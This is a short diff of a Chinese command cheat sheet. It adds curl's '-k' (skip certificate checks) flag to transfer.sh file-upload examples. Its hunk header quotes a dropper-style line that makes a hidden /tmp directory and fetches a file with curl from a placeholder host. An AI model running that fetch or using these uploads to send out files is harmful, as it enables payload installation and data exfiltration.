@@ -430,8 +430,8 @@ mkdir /tmp/.qHFnC; rm -f /tmp/.qHFnC/uiRaBszrxF; curl -A O -L http://x.x.x.x/pKf
 ### https://transfer.sh/ 文件传输
 ```
 上传
-curl --upload-file 文件 https://transfer.sh/文件名
-curl --upload-file /root/hello.txt https://transfer.sh/hello.txt
+curl -k --upload-file 文件 https://transfer.sh/文件名
+curl -k --upload-file /root/hello.txt https://transfer.sh/hello.txt
 下载
 https://transfer.sh/get/1TghfFb/hello.txt
 ```
